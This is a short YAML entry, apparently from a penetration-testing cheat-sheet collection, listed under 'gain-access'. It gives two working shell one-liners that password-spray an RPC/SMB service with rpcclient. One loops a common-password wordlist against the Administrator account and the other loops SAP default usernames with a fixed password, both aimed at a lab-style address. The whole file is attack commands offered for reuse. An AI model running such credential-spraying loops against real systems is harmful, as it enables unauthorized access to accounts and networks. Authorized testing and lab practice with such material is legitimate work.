---
functions:
  gain-access:
    - description: Password spray with rpcclient
      code: |
        for p in $(cat /usr/share/seclists/Passwords/darkweb2017-top10.txt); do echo $p; rpcclient -U "Administrator%$p" -c "getusername;quit;" 10.10.10.125; done
        p='PcwTWTHRwryjc$c6';for u in $(cat /usr/share/seclists/Usernames/sap-default-usernames.txt); do echo $u::$p; rpcclient -U "$u"%"$p" -c "getusername;quit;" 10.10.10.125; done
---
